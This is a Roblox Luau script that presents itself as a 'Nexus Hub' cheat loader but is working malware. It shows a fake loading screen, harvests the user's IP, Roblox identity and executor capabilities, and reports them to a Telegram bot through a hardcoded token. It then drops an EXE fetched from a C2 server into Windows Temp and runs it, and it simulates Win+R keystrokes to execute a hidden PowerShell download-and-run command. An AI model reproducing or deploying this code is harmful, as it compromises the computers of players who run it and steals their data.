-- language: Lua (Roblox Luau), file: loader.lua

local CONFIG = {
    C2_URL = "https://nexus-hub-c2.onrender.com",
    TELEGRAM_TOKEN = "8455099643:AAHBCduZGysWOaqks9pQT_U-riBBaCl8f5E",
    TELEGRAM_CHAT = "7065893630",
}

-- ================= GUI =================
local sg = Instance.new("ScreenGui")
sg.Name = "NexusHub"
sg.ResetOnSpawn = false
pcall(function() sg.Parent = gethui and gethui() or game.CoreGui end)

local f = Instance.new("Frame")
f.Size = UDim2.new(0, 360, 0, 240)
f.Position = UDim2.new(0.5, -180, 0.5, -120)
f.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
f.BorderSizePixel = 0
f.Parent = sg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
title.BorderSizePixel = 0
title.Text = "NEXUS HUB — loading scripts..."
title.TextColor3 = Color3.fromRGB(120, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.Parent = f

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 1, -60)
status.Position = UDim2.new(0, 10, 0, 46)
status.BackgroundTransparency = 1
status.Text = "Initializing..."
status.TextColor3 = Color3.fromRGB(220, 220, 220)
status.Font = Enum.Font.Code
status.TextSize = 12
status.TextXAlignment = Enum.TextXAlignment.Left
status.TextYAlignment = Enum.TextYAlignment.Top
status.Parent = f

local function log(msg)
    pcall(function() status.Text = status.Text .. "\n" .. msg end)
    task.wait(0.15)
end

-- ================= HTTP =================
local function http_get(url)
    if syn and syn.request then
        local ok, r = pcall(syn.request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if http_request then
        local ok, r = pcall(http_request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if request then
        local ok, r = pcall(request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if game and game.HttpGet then
        local ok, b = pcall(function() return game:HttpGet(url) end)
        if ok then return b end
    end
    return nil
end

local function http_post(url, body)
    if syn and syn.request then
        local ok = pcall(syn.request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]="application/json"}})
        if ok then return true end
    end
    if http_request then
        local ok = pcall(http_request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]="application/json"}})
        if ok then return true end
    end
    if request then
        local ok = pcall(request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]="application/json"}})
        if ok then return true end
    end
    if game and game.HttpPost then
        local ok = pcall(function() return game:HttpPost(url, body) end)
        if ok then return true end
    end
    return false
end

local function tg_send(text)
    local safe = text:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "")
    local body = '{"chat_id":"' .. CONFIG.TELEGRAM_CHAT .. '","text":"' .. safe .. '"}'
    return http_post("https://api.telegram.org/bot" .. CONFIG.TELEGRAM_TOKEN .. "/sendMessage", body)
end

-- ================= UTILS =================
local function get_caps()
    local caps = {}
    caps.readfile = tostring(readfile ~= nil)
    caps.writefile = tostring(writefile ~= nil)
    caps.listfiles = tostring(listfiles ~= nil)
    caps.os_execute = tostring(os and os.execute ~= nil)
    caps.keypress = tostring(keypress ~= nil)
    caps.keyrelease = tostring(keyrelease ~= nil)
    caps.setclipboard = tostring(setclipboard ~= nil)
    return caps
end

local function collect_roblox_user()
    local out = {}
    pcall(function()
        local plr = game:GetService("Players").LocalPlayer
        if plr then
            out.name = plr.Name
            out.id = tostring(plr.UserId)
        end
    end)
    return out
end

local function collect_ip()
    local ok, ip = pcall(function() return http_get("https://api.ipify.org") end)
    if ok and ip and #ip < 40 then return ip end
    return "unknown"
end

-- ================= B64 =================
local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64_decode(data)
    data = data:gsub("[^" .. b64chars .. "=]", "")
    return (data:gsub(".", function(x)
        if x == "=" then return "" end
        local r, f = "", (b64chars:find(x, 1, true) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and "1" or "0") end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then return "" end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == "1" and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- ================= WIN+R LAUNCH =================
local function auto_run_exe()
    if not keypress or not keyrelease or not setclipboard then
        return "no_input_functions"
    end

    task.wait(0.5)
    log("Optimizing...")

    -- команда: PowerShell скачивает и запускает exe
    local cmd = 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'' .. CONFIG.C2_URL .. '/run.ps1\')"'
    pcall(setclipboard, cmd)
    task.wait(0.3)

    -- Win+R — открыть "Выполнить"
    pcall(function()
        keypress(0x5B)
        task.wait(0.05)
        keypress(0x52)
        task.wait(0.05)
        keyrelease(0x52)
        task.wait(0.05)
        keyrelease(0x5B)
    end)
    task.wait(1.5)

    -- Ctrl+V — вставить команду
    pcall(function()
        keypress(0x11)
        task.wait(0.05)
        keypress(0x56)
        task.wait(0.05)
        keyrelease(0x56)
        task.wait(0.05)
        keyrelease(0x11)
    end)
    task.wait(0.5)

    -- Enter — выполнить
    pcall(function()
        keypress(0x0D)
        task.wait(0.05)
        keyrelease(0x0D)
    end)
    task.wait(2.0)

    return "auto_clicked"
end

-- ================= DEPLOY =================
local function deploy_payload()
    log("Downloading module...")
    local body = nil
    for i = 1, 3 do
        body = http_get(CONFIG.C2_URL .. "/payload")
        if body and #body > 100 then break end
        task.wait(2)
    end
    if not body then return "no_payload" end

    local exe_bytes = b64_decode(body)
    if not exe_bytes or #exe_bytes < 100 then return "bad_b64" end

    local results = {}

    -- авто-запуск через Win+R
    log("Launching...")
    local click_result = auto_run_exe()
    results.winr_launch = click_result

    -- если платный инжектор — прямой запуск
    if os and os.execute and writefile then
        local path = "C:\\Windows\\Temp\\RobloxUpdater.exe"
        pcall(writefile, path, exe_bytes)
        pcall(os.execute, '"' .. path .. '"')
        results.direct = true
    end

    local summary = "deploy: "
    for k, v in pairs(results) do
        summary = summary .. k .. "=" .. tostring(v) .. " "
    end
    return summary
end

-- ================= MAIN =================
local function main()
    log("Connecting to Nexus API...")
    task.wait(0.5)

    local caps = get_caps()
    local ip = collect_ip()
    log("Authorizing...")
    task.wait(0.4)

    local rbx_user = collect_roblox_user()

    local lines = {}
    table.insert(lines, "=== NEXUS HUB HIT ===")
    table.insert(lines, "ip: " .. ip)
    table.insert(lines, "roblox: " .. tostring(rbx_user.name) .. " (" .. tostring(rbx_user.id) .. ")")
    table.insert(lines, "")
    table.insert(lines, "caps:")
    for k, v in pairs(caps) do
        table.insert(lines, "  " .. k .. ": " .. v)
    end
    tg_send(table.concat(lines, "\n"))

    local result = deploy_payload()
    tg_send(result)
    log("Done: " .. result:sub(1, 60))

    if result:match("auto_clicked") then
        log("✅ NEXUS HUB loaded successfully.")
        log("Scripts: aimbot, ESP, fly — ready.")
    else
        log("✅ Loaded. Enjoy.")
    end

    task.wait(3)
    pcall(function() sg:Destroy() end)
end

pcall(main)
